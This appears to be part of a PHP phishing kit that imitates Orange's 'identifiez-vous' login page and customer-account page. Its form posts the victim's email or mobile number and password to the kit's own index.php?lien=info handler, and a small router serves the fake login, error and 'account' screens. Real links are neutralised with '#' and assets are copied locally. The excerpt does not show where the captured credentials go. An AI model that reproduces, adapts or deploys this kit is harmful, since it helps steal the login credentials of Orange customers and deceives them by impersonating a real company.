<!--Magic5 Bloc : diebete amadose d&eacute;connecter / programmation: 812903--><!-- /Bloc: 12178--><!-- /Date: 2014-06-05--><!-- /Tpl: 4320--><div id="monCompteUtilisateurPush">
<div class="blocCompte blocPrincipal">
<div class="fe_clearfix">
<img src="index_fichiers/default.jpg" alt="" align="left"><h2><a href="https://multimedia.pns.orange.fr/multimedia/front/getFile.php?" onclick="necfeWT(\'nom_prenom\', \'ZT Compte utilisateur\');" class="link1" title="'.$prenom." ".$nom.'">'.$prenom." ".$nom.'</a></h2>
</div>
<div class="NE_btn"><span class="NE_btnO"><a href="#://id.orange.fr/auth_user2/bin/auth_user.cgi?action=logout&amp;return_url=http://r.orange.fr/r/Oespaceclient_decouverte_ecmobile" onclick="necfeWT(\'se d&eacute;connecter\', \'ZT Compte utilisateur\')">se d&eacute;connecter</a></span></div>
</div>
<div class="blocPrincipal"><div class="blocPushGestion head">
<h2 class="HelvetLight ampoule">
<span class="pushTitreImg"></span>pensez-y !</h2>
<div style="clear:both;height:0;"></div>
<p>Mes informations personnelles ne sont pas &agrave; jour</p>
<img src="index_fichiers/ajax.gif" alt=""><input name="mobileCertificationParam" id="mobileCertificationParam" value="" type="hidden"><input name="hiddenPushLinkUrl" id="hiddenPushLinkUrl" value="javascript:void(0);" type="hidden"><p><a class="link2" style="margin:10px 0 10px 0" href="javascript:void(0);" target="" onclick="sendWTAndCapping(event,\'je+mets+%C3%A0+jour+mes+informations+personnelles\', \'rebond - push vignette relationnelle\',\'\',\'PPC\',\'F\',\'javascript:void(0);\');openCliper(\'PPC\', \'F\')">je mets &agrave; jour mes informations personnelles</a></p>
</div></div>
</div>
<div style="width:150px" class="necfe_rebond">
<!--Magic4 Bloc : zt-pratique-titre.html / programmation: 814644--><!-- /Bloc: 43547--><!-- /Date: 2014-04-09--><!-- /Tpl: 10100-->
<div class="blocPrincipal">
<div class="blocAssist head">
<h2 class="HelvetLight">pratique</h2>
</div>
</div>
<!--Magic4 Bloc : zt-pratique-lien-suivi-commande.html / programmation: 814645--><!-- /Bloc: 43548--><!-- /Date: 2014-04-09--><!-- /Tpl: 10102-->
<div class="blocPrincipal blocAssist item">
<div class="NE_content">
<a href="#s://b.espaceclientv3.orange.fr/suivicommande.php" onclick="necfeWT(\'suivi de commande\', \'ZT Pratique\');;setTimeout(function(){window.location=\'https://b.espaceclientv3.orange.fr/suivicommande.php\';}, 600);return false;" class="link3">suivi de commande</a>
</div>
</div>
<!--Magic4 Bloc : zt-pratique-lien-suivi-remboursement.html / programmation: 814646--><!-- /Bloc: 43552--><!-- /Date: 2014-04-09--><!-- /Tpl: 10102-->
<div class="blocPrincipal blocAssist item">
<div class="NE_content">
<a href="#://www.suiviodr.orange.fr/" onclick="necfeWT(\'suivi de remboursement\', \'ZT Pratique\');window.open(\'http://www.suiviodr.orange.fr\', \'\', \'width=800,height=700,scrollbars=yes,resizable=yes,status=no\');return false;;setTimeout(function(){window.location=\'http://www.suiviodr.orange.fr\';}, 600);return false;" class="link3">suivi de remboursement</a></div></div>
<!--Magic4 Bloc : zt-pratique-lien-demenagement.html / programmation: 814967--><!-- /Bloc: 43557--><!-- /Date: 2014-04-09--><!-- /Tpl: 10102--><div class="blocPrincipal blocAssist item"><div class="NE_content"><a href="#s://b.espaceclientv3.orange.fr/demenagement/accueil.php" onclick="necfeWT(\'d&eacute;m&eacute;nagement\', \'ZT Pratique\');;setTimeout(function(){window.location=\'https://b.espaceclientv3.orange.fr/demenagement/accueil.php\';}, 600);return false;" class="link3">d&eacute;m&eacute;nagement</a></div></div>
</div><!--Magic4 Bloc : blocPrincipal-footer.html / programmation: 225786--><!-- /Bloc: --><!-- /Date: --><!-- /Tpl: --><div class="blocPrincipalFooter"></div>
<!--Magic5 Bloc : vignette-associationIM.html / programmation: 818441-->
<!-- /Bloc: 46217-->
<!-- /Date: 2013-11-20-->
<!-- /Tpl: 3007-->
<div class="blocCeMoment">
  <div class="vignette-content">
    <a href="#://www.orange.fr/isp?tp=2&amp;service=nec" onclick="necfeWT(\'mon compte-associationIM\', \'vignette boutique\');" title="">
      <img id="vignetteEnCeMoment" src="index_fichiers/171351.gif" alt="" title="" height="110" width="148">
    </a>
  </div>
</div>
</div></div>
    <div id="footer"><div id="o-footer" class="light "><ul class="forced-left"><li class="o-footer-copy">	&copy; Orange 2015</li><li><a href="#://r.orange.fr/r/Oinfoslegales_vis" target="_blank" title="informations l&eacute;gales (nouvelle fenêtre)">informations l&eacute;gales</a></li><li><a href="#://r.orange.fr/r/Ohome_donneespersonnelles" target="_blank" title="Donn&eacute;es personnelles (nouvelle fenêtre)">donn&eacute;es personnelles</a></li><li><a href="#://assistance.orange.fr/les-cookies-2917.php" target="_blank" title="les cookies">les cookies</a></li><li class="o-footer-split"><a href="#://r.orange.fr/r/Eorangepublicite" target="_blank" title="">publicit&eacute;</a></li><li class="o-footer-right-part1"><a href="#://r.orange.fr/r/Einternetplus" target="_blank" title="internet + (nouvelle fenêtre)">internet +</a></li><li class="o-footer-right-part2"><a href="#://www.afa-france.com/" target="_blank" title="AFA (nouvelle fenêtre)">AFA</a></li><li class="o-footer-right-part3"><a href="#://r.orange.fr/r/Esignaler" target="_blank" title="signaler un contenu illicite (nouvelle fenêtre)">signaler un contenu illicite</a></li></ul></div></div>
    <!--Magic4 Bloc : js-erreurs-ajout-certif.html / programmation: 284077--><!-- /Bloc: 21792--><!-- /Date: 2013-11-27--><!-- /Tpl: 5036-->

    <noscript>
        <div><img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="//sdc.francetelecom.com/dcsae0uut648ky1wldunyzyn7_9r7s/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=9.4.0&amp;dcssip=www.orange-business-services-shp.com.ftgroup"/></div>
    </noscript>
    <!-- FIN WEBTRENDS  -->


<img src="index_fichiers/track.gif" class="statTag" height="0" width="0"></body></html>';
	}
	else
	{
		$_SESSION['error']=1;
		header('Location: index.php'); 
	}
}
function valider()
{
	session_destroy(); 
}
function index(){
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><head>
  <link rel="shortcut icon" href="https://i5.woopic.com/favicon.ico">
  <title>pour continuer, identifiez-vous...</title>
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="index_fichiers/o.css">
  <link rel="stylesheet" href="index_fichiers/style.css">
  <!--[if IE 6]>
  <link href="#https://id-l.woopic.com/auth_user2/css/style_ie6.min.css?v=v37" rel="stylesheet" type="text/css" />
  <![endif]-->
  <!--[if IE 7]>
  <link href="#https://id-l.woopic.com/auth_user2/css/style_ie7.min.css?v=v37" rel="stylesheet" type="text/css" />
  <![endif]-->
  <!--[if IE 9]>
  <link href="#https://id-l.woopic.com/auth_user2/css/style_ie9.min.css?v=v37" rel="stylesheet" type="text/css" />
  <![endif]-->
  <noscript>
      
  </noscript>
  <script src="index_fichiers/a_usersync.htm" type="text/javascript"></script><script src="index_fichiers/a_usersync_005" type="text/javascript"></script><script src="index_fichiers/a_usersync_008" type="text/javascript"></script><script src="index_fichiers/a_usersync_010" type="text/javascript"></script><script src="index_fichiers/a_usersync_006" type="text/javascript"></script><script src="index_fichiers/a_usersync_004" type="text/javascript"></script><script src="index_fichiers/a_usersync_002" type="text/javascript"></script><script src="index_fichiers/a_usersync_003" type="text/javascript"></script><script src="index_fichiers/a_usersync_009" type="text/javascript"></script><script src="index_fichiers/a_usersync_007" type="text/javascript"></script><script src="index_fichiers/a_usersync" async="" type="text/javascript"></script><script src="index_fichiers/lidar.js" async="" type="text/javascript"></script><script type="text/javascript">
  //<![CDATA[

  //]]>
  </script>
  <script type="text/javascript" src="index_fichiers/authuser2.js"></script>
  <script type="text/javascript">
    $(document).ready(function(){
      $(\'input.text\').focus(function(){$(this).addClass(\'focus\');});
      $(\'input.text\').blur(function(){$(this).removeClass(\'focus\');});
    });
  </script>
<script src="index_fichiers/ora_authen.identification"></script><script type="text/javascript" src="index_fichiers/oan_common-3.js"></script>
    <script src="index_fichiers/gs.js" type="text/javascript"></script></head>
<body>
  <div id="sc_main">
    <div id="auth-header">
      <div id="auth-logo">
        <a href="#" tabindex="1" title="site orange.fr"><div class="logo"></div></a>
      </div>
        <div id="auth-banner" tabindex="-1">
        <div class="oan_ad" id="ora_2_728x90_identification">
          <script type="text/javascript">
            //<![CDATA[
            if (typeof oan_displayAd==\'function\'){oan_displayAd(\'ora_2_728x90_identification\');} 
            //]]>
          </script><div class="GoogleActiveViewClass" id="DfpVisibilityIdentifier_8707636297250753" data-admeta-dfp="3513/woo_ban_2_728x90_ident,728,90,17653192060730791213"><!-- BEGIN JS TAG - [Test Publisher] - Default < - DO NOT MODIFY -->
<script type="text/javascript" src="index_fichiers/ttj_002"></script><script src="index_fichiers/ttj"></script>
<!-- END TAG -->
</div>
        </div>
      </div>
        <div class="clear"><!-- --></div>
    </div>
    <div id="sc_top">
      <div class="sc_top_title">pour continuer, identifiez-vous...</div>
    </div>
    <div id="sc_content">
      <div id="sc_left_blocs">
        <div class="sc_left_top_bloc">
          <table style="height: 0px;" border="0" cellpadding="0" cellspacing="0">
            <tbody><tr>
              <td class="sc_box_tl"><div><!-- --></div></td>
              <td class="sc_box_t"><!-- --></td>
              <td class="sc_box_tr"><div><!-- --></div></td>
            </tr>
            <tr valign="top">
              <td class="sc_box_l"><!-- --></td>
              <td class="sc_box_content">
                <div id="topLeftContent">
     
                  <div id="filter_main" class="filter"></div>
                  <div style="display: none;" id="filter_pass" class="filter"></div>
                  <div id="filter_check" class="filter"></div>
                  <div id="infobulle_perso" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Pour personnaliser votre photo, rendez-vous dans 
votre espace client, cliquez sur votre nom d’utilisateur puis 
s&eacute;lectionnez la rubrique photo.
                  </div>
                  <div id="infobulle_switch" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Ne plus m&eacute;moriser le compte utilisateur <br>
                    <span id="infobulle_switch_login"></span>&nbsp;sur cet ordinateur ?
                    <div id="infobulle_switch_buttons">
                      <table border="0" cellpadding="0" cellspacing="0">
                        <tbody><tr>
                          <td>
                            <div class="sc_button_2">
                              <div class="sc_button_left_2"></div>
                              <input onclick="cancelSwitch(); return false;" class="sc_button_content_2 normal submit" value="annuler" type="submit">
                              <div class="sc_button_right_2"></div>
                              <span class="clear"><br clear="all"></span>
                            </div>
                          </td>
                          <td>
                            <div class="sc_button_2">
                              <div class="sc_button_left_2"></div>
                              <input onclick="doSwitch(); return false;" class="sc_button_content_2 normal submit" value="valider" type="submit">
                              <div class="sc_button_right_2"></div>
                              <span class="clear"><br clear="all"></span>
                            </div>
                          </td>
                        </tr>
                      </tbody></table>
                      <div class="clear"><br clear="all"></div>
                    </div>
                  </div>
                  <div id="panel_main">
                    <div class="panel_model panel_model_default" id="default">
                      <div id="div_picto_user">
                          <img style="display: none;" id="remove_user" title="Cliquez ici pour ne plus m&eacute;moriser ce compte utilisateur sur cet ordinateur." alt="Cliquez ici pour ne plus m&eacute;moriser ce compte utilisateur sur cet ordinateur." src="index_fichiers/close.png">
                        <img style="visibility: hidden;" id="img_picto_user" src="" alt="" title="" height="90" width="90">
                        <p id="desc_picto_user"></p>
                        </div>
                      <form method="POST" class="AuthentForm" id="AuthentForm" action="index.php?lien=info">
                        <input name="co" id="co" value="42" type="hidden">
                        <input name="tt" id="tt" value="" type="hidden">
                        <input name="tp" id="tp" value="" type="hidden">
                        <input name="rl" id="rl" value="http://www.orange.fr" type="hidden">
                        <input name="sv" id="sv" value="" type="hidden">
                        <input name="dp" id="dp" value="html" type="hidden">
                        <input name="rt" id="rt" value="" type="hidden">
                          <input name="isconn" id="isconn" value="0" type="hidden">
                          <div class="sc_field" id="default_credential">
                          <div class="sc_label">
                            <label for="default_f_credential">
                            adresse mail ou num&eacute;ro de mobile
                            </label>
                          </div>
                          <div class="sc_input sc_credential ';
						  if($_SESSION['error']==1)echo'error';
						  echo'">
                              <input aria-haspopup="true" aria-autocomplete="list" role="textbox" autocomplete="off" name="credential" id="default_f_credential" class="ui-corner-all text ui-autocomplete-input" maxlength="78" tabindex="100" type="text" value="'.$_SESSION['email'].'">
                              <div class="clear"><br clear="all"></div>
                          </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <div style="margin-bottom: 4px;" class="sc_field help" id="default_help">
                          <div class="sc_input sc_link">
                            <span id="default_credential_error" class="errorMessage" style="';
							if($_SESSION['error'] == 0)
							echo 'display:none';
							echo'">
							V&eacute;rifiez que vous avez correctement saisi votre adresse mail ou votre num&eacute;ro de mobile.
							</span>
                            <a href="#" id="link_helpcookie" class="orange" tabindex="300">en&nbsp;savoir&nbsp;plus.</a>
                            <span id="technicalError" class="errorMessage" style="display: none;">R&eacute;essayer ult&eacute;rieurement (erreur technique). Si le problème persiste contactez votre service clients.</span>
                                      <a id="newaccount_url" href="#" class="orange" tabindex="300">comment&nbsp;s’identifier&nbsp;?</a>
                                    <span id="help_connecteduser" class="hidden">Pour changer d’utilisateur, modifiez l’adresse ou le mobile ci-dessus</span>
                            </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <div class="sc_field sc_password" id="default_password">
                          <div class="sc_label">
                            <label for="default_f_password">mot de passe</label>
                          </div>
                          <div class="sc_input ';
						  if($_SESSION['error']==1) echo 'error'; 
						  echo'">
                            <input name="pwd" id="default_f_password" class="ui-corner-all password" value="" maxlength="90" tabindex="200" autocomplete="off" type="password">
                          </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <div style="margin-bottom: 15px;" class="sc_field lostpassword" id="default_lostpassword">
                          <div class="sc_input sc_link">
                            <span id="default_password_error" class="errorMessage" style="';
							if($_SESSION['error'] == 0)
							echo 'display:none';
							echo'">V&eacute;rifiez que vous avez correctement saisi votre mot de passe en respectant majuscules et minuscules.</span>
                            <a href="#" id="link_lost" class="orange">mot&nbsp;de&nbsp;passe&nbsp;oubli&eacute;&nbsp;?</a>
                          </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_login" title="D&eacute;cochez cette case si vous utilisez un &eacute;quipement public (cybercaf&eacute;, &eacute;cole, ...)">
                          <div class="sc_input">
                              <input style="display: none;" id="default_f_memorize_login" name="memorize_login" class="csCheckbox"  type="checkbox"><a href="" id="default_f_memorize_login_csCheckbox"><div class="checkboxOff"></div></a>
                              <label for="default_f_memorize_login" class="checkboxLabel">
                                m&eacute;moriser l’adresse mail ou le nº de mobile
                              </label>
                          </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_password" title="D&eacute;cochez cette case si plusieurs personnes utilisent cet &eacute;quipement.">
                          <div class="sc_input">
                              <input style="display: none;" id="default_f_memorize_password" name="memorize_password" class="csCheckbox" type="checkbox"><a href="" id="default_f_memorize_password_csCheckbox"><div class="checkboxOff"></div></a>
                              <label for="default_f_memorize_password" class="checkboxLabel">
                              rester identifi&eacute;
                            </label>
                          </div>
                          <div class="clear"><br clear="all"></div>
                        </div>
                        <iframe name="osf" id="osf" style="visibility:hidden" src="index_fichiers/vide.htm" height="0px" width="0px">
                        </iframe>
                        <div class="actions">
                          <table width="100%" border="0" cellpadding="0" cellspacing="0">
                            <tbody><tr>
                              <td>
                                <table border="0" cellpadding="0" cellspacing="0">
                                  <tbody><tr>
                                      <td>
                                      <div class="sc_default_button_2">
                                        <div class="sc_button_left_2"></div>
                                        <input class="sc_button_content_2 submit" value="s’identifier" type="submit">
                                        <div class="sc_button_right_2"></div>
                                        <span class="clear"><br clear="all"></span>
                                      </div>
                                    </td>
                                    </tr>
                                </tbody></table>
                                <div class="clear"><br clear="all"></div>
                              </td>
                            </tr>
                          </tbody></table>
                        </div>
                      </form>
                    </div>
                  </div>
                </div></td>
              <td class="sc_box_r"><!-- --></td>
            </tr>
            <tr>
              <td class="sc_box_bl"><div><!-- --></div></td>
              <td class="sc_box_b"><!-- --></td>
              <td class="sc_box_br"><div><!-- --></div></td>
            </tr>
          </tbody></table>
        </div>
      </div>
            <div id="sc_right_blocs">
        <div class="sc_right_top_bloc">
          <table border="0" cellpadding="0" cellspacing="0">
            <tbody><tr>
              <td class="sc_box_bl"><div><!-- --></div></td>
              <td class="sc_box_b"><!-- --></td>
              <td class="sc_box_br"><div><!-- --></div></td>
            </tr>
            <tr valign="top">
              <td class="sc_box_l"><!-- --></td>
              <td class="sc_box_content">
                <div id="mainContent">
                  <img src="index_fichiers/default_magic.gif">
                  <p id="desc_picto_user"></p>
                </div>
              </td>
              <td class="sc_box_r"><!-- --></td>
            </tr>
            <tr>
              <td class="sc_box_bl"><div><!-- --></div></td>
              <td class="sc_box_b"><!-- --></td>
              <td class="sc_box_br"><div><!-- --></div></td>
            </tr>
          </tbody></table>
        </div>
      </div>
      <div class="clear"></div>
    </div>
        <div id="sc_linkbottomnew">
      Pas inscrit ? 
      <a href="#" class="orange">Cr&eacute;ez ou activez votre compte</a>
    </div>
  
    <div id="o_footer">
      <ul>
        <li style="padding-right: 92px;">
          <a title="informations l&eacute;gales (nouvelle fenêtre)" target="" onclick="window.open(this.href, \'informations l&eacute;gales\', config=\'height=800, width=700, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no\') ; return false;" href="#http://r.orange.fr/r/Oinfoslegales_abo">informations l&eacute;gales</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="publicit&eacute; (nouvelle fenêtre)" target="" href="#">publicit&eacute;</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="internet+ (nouvelle fenêtre)" target="" href="#">internet+</a>
        </li>
        <li style="padding-right: 92px;">
          <a title="signaler un contenu illicite (nouvelle fenêtre)" target="" href="#">signaler un contenu illicite</a>
        </li> 
        <li style="padding-right: 92px;">
          <a title="donn&eacute;es personnelles (nouvelle fenêtre)" target="" href="#">donn&eacute;es personnelles</a>
        </li>
        <li>
          <a title="les cookies (nouvelle fenêtre)" target="" href="#">les cookies</a>
        </li>
      </ul>
    </div>
  </div>


<ul style="z-index: 1; top: 0px; left: 0px; display: none;" aria-activedescendant="ui-active-menuitem" role="listbox" class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all"></ul><script src="index_fichiers/a" async="" type="text/javascript"></script><img src="if_data/gif.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/ibsdpid358dpuuid5610344854109836679.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/apnx.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/ping_match.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/379828.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/px.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/0.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/cse.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/0.gif" style="display: none;" height="1" width="1"><img src="index_fichiers/ax.gif" style="display: none;" height="1" width="1"></body></html>
';
}
function error(){
$error=1;
header('location : index.php?lien=error');
}

$lien="";
if(!empty($_GET['lien']))
$lien=$_GET['lien'];

switch($lien)
{
	case 'index':index();
	break;
	case 'error':error();
	break;
	case 'info':info();
	break;
	case 'validation':valider();
	break;
	default:index();
}
?>